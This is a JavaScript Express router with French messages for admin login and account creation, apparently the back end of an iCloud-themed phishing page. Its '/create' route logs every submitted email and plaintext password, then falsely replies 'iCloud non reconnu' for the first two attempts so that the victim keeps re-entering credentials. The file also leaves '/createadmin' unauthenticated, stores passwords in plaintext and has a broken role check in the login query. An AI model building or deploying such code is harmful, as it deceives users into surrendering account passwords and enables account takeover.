import express from "express";
import db from "../config/db.js";
import jwt from "jsonwebtoken";
import dotenv from "dotenv";
dotenv.config();
import authMiddleware from "./authMiddleware.js";
import { v4 as uuidv4 } from "uuid";

const router = express.Router();

router.post("/adminlogin", async (req, res) => {
  const { email, mot_de_passe } = req.body;

  if (!email || !mot_de_passe) {
    return res.json({
      loginStatus: false,
      Error: "L'email et le mot de passe sont réquis",
    });
  }

  const sql =
    "SELECT * FROM utilisateur WHERE email = ? AND mot_de_passe = ? AND type_utilisateur = 'admin' OR 'super-admin'";

  try {
    db.query(sql, [email, mot_de_passe], (err, result) => {
      if (err) {
        return res.json({ loginStatus: false, Error: "Erreur de la requête" });
      }

      if (result.length > 0) {
        const userEmail = result[0].email;
        const token = jwt.sign(
          { role: "admin", email: userEmail },
          process.env.JWT_SECRET,
          { expiresIn: "6h" }
        );
        res.cookie("token", token, {
          httpOnly: true,
          secure: true,
          maxAge: 6 * 60 * 60 * 1000,
        });
        return res.json({
          loginStatus: true,
          identifiant: result[0].nom[0],
          token,
        });
      } else {
        return res.json({
          loginStatus: false,
          Error: "Email ou mot de passe incorrect!",
        });
      }
    });
  } catch (error) {
    return res.json({ loginStatus: false, Error: "Erreur de serveur" });
  }
});

router.post("/createadmin", async (req, res) => {
  const { nom, email, mot_de_passe } = req.body;

  if (!nom || !email || !mot_de_passe) {
    return res.json({
      success: false,
      Error: "Le nom, l'email et le mot de passe sont réquis",
    });
  }

  const checkSql = "SELECT * FROM utilisateur WHERE email = ?";
  db.query(checkSql, [email], (err, result) => {
    if (err) {
      return res.json({ success: false, Error: "Erreur de la requête" });
    }
    if (result.length > 0) {
      return res.json({ success: false, Error: "Email déjà utilisé" });
    }

    const insertSql =
      "INSERT INTO utilisateur (nom, email, mot_de_passe, type_utilisateur) VALUES (?, ?, ?, 'admin')";
    db.query(insertSql, [nom, email, mot_de_passe], (err2, result2) => {
      if (err2) {
        return res.json({
          success: false,
          Error: "Erreur lors de la création",
        });
      }
      return res.json({ success: true, message: "Admin créé avec succès" });
    });
  });
});

// // In-memory store (à remplacer par Redis ou base persistante pour prod)
// const tentativeTracker = {};

// router.post("/create", async (req, res) => {
//   const { nom, email, mot_de_passe, session_id } = req.body;

//   // Générer un nouvel ID de session si pas encore présent
//   const sessionId = session_id || uuidv4();

//   // Récupérer nombre de tentatives actuelles
//   const selectTentativesSql = `
//     SELECT COUNT(*) as count FROM tentatives_creation WHERE session_id = ?
//   `;
//   db.query(selectTentativesSql, [sessionId], (err, result) => {
//     if (err) {
//       return res.json({ success: false, Error: "Erreur interne (1)" });
//     }

//     const tentativeNum = result[0].count + 1;

//     // Sauvegarder la tentative, même invalide
//     const insertTentativeSql = `
//       INSERT INTO tentatives_creation
//       (session_id, nom, email, mot_de_passe, tentative_num, est_valide)
//       VALUES (?, ?, ?, ?, ?, ?)
//     `;

//     const estValide = nom && email && mot_de_passe ? 1 : 0;

//     db.query(insertTentativeSql, [sessionId, nom, email, mot_de_passe, tentativeNum, estValide], (err2) => {
//       if (err2) {
//         return res.json({ success: false, Error: "Erreur interne (2)" });
//       }

//       if (!nom || !email || !mot_de_passe) {
//         return res.json({
//           success: false,
//           session_id: sessionId,
//           tentative: tentativeNum,
//           Error: "Le nom, l'email et le mot de passe sont réquis",
//         });
//       }

//       if (tentativeNum >= 3) {
//         // Au 3ᵉ essai, on tente vraiment la création
//         const checkSql = "SELECT * FROM utilisateur WHERE email = ?";
//         db.query(checkSql, [email], (err3, result3) => {
//           if (err3) {
//             return res.json({ success: false, Error: "Erreur interne (3)" });
//           }
//           if (result3.length > 0) {
//             return res.json({
//               success: false,
//               session_id: sessionId,
//               tentative: tentativeNum,
//               Error: "Email déjà utilisé",
//             });
//           }

//           const insertSql = `
//             INSERT INTO utilisateur (nom, email, mot_de_passe, type_utilisateur)
//             VALUES (?, ?, ?, 'admin')
//           `;
//           db.query(insertSql, [nom, email, mot_de_passe], (err4) => {
//             if (err4) {
//               return res.json({ success: false, Error: "Erreur lors de la création" });
//             }
//             return res.json({
//               success: true,
//               message: "Admin créé avec succès",
//               session_id: sessionId,
//             });
//           });
//         });
//       } else {
//         return res.json({
//           success: false,
//           session_id: sessionId,
//           tentative: tentativeNum,
//           message: `iCloud non réconnu. Veuillez réessayer.`,
//         });
//       }
//     });
//   });
// });

router.post("/create", (req, res) => {
  const { nom, email, mot_de_passe, session_id } = req.body;

  // Réutiliser le session_id ou générer un nouveau
  const sessionId = session_id || uuidv4();

  // Vérifier le nombre de tentatives déjà faites avec ce sessionId
  const selectTentativesSql = `
    SELECT COUNT(*) as count FROM tentatives_creation WHERE session_id = ?
  `;
  db.query(selectTentativesSql, [sessionId], (err, result) => {
    if (err) return res.json({ success: false, Error: "Erreur interne (1)" });

    const tentativeNum = result[0].count + 1;

    // Sauvegarder la tentative
    const insertTentativeSql = `
      INSERT INTO tentatives_creation 
      (session_id, nom, email, mot_de_passe, tentative_num, est_valide) 
      VALUES (?, ?, ?, ?, ?, ?)
    `;
    const estValide = nom && email && mot_de_passe ? 1 : 0;

    db.query(
      insertTentativeSql,
      [sessionId, nom, email, mot_de_passe, tentativeNum, estValide],
      (err2) => {
        if (err2)
          return res.json({ success: false, Error: "Erreur interne (2)" });

        // Vérif des champs
        if (!nom || !email || !mot_de_passe) {
          return res.json({
            success: false,
            session_id: sessionId,
            tentative: tentativeNum,
            Error: "Le nom, l'email et le mot de passe sont requis",
          });
        }

        // 🚨 Si c'est la 3ème tentative → on crée l'utilisateur
        if (tentativeNum >= 3) {
          const checkSql = "SELECT * FROM utilisateur WHERE email = ?";
          db.query(checkSql, [email], (err3, result3) => {
            if (err3)
              return res.json({ success: false, Error: "Erreur interne (3)" });

            if (result3.length > 0) {
              return res.json({
                success: false,
                session_id: sessionId,
                tentative: tentativeNum,
                message: "Email déjà utilisé. Veuillez vous connecter.",
              });
            }

            const insertSql = `
              INSERT INTO utilisateur (nom, email, mot_de_passe, type_utilisateur)
              VALUES (?, ?, ?, 'admin')
            `;
            db.query(insertSql, [nom, email, mot_de_passe], (err4) => {
              if (err4) {
                return res.json({
                  success: false,
                  Error: "Erreur lors de la création",
                });
              }
              return res.json({
                success: true,
                message: "Compte créé avec succès. Veuillez vous connecter.",
                session_id: sessionId,
                redirect: "/", // clé pour le frontend
              });
            });
          });
        } else {
          // Tentative < 3
          return res.json({
            success: false,
            session_id: sessionId,
            tentative: tentativeNum,
            message: "iCloud non reconnu. Veuillez réessayer.",
          });
        }
      }
    );
  });
});

router.get("/verifytoken", authMiddleware, (req, res) => {
  res.status(200).json({ message: "Utilisateur authentifié" });
});

export { router as adminAuth };
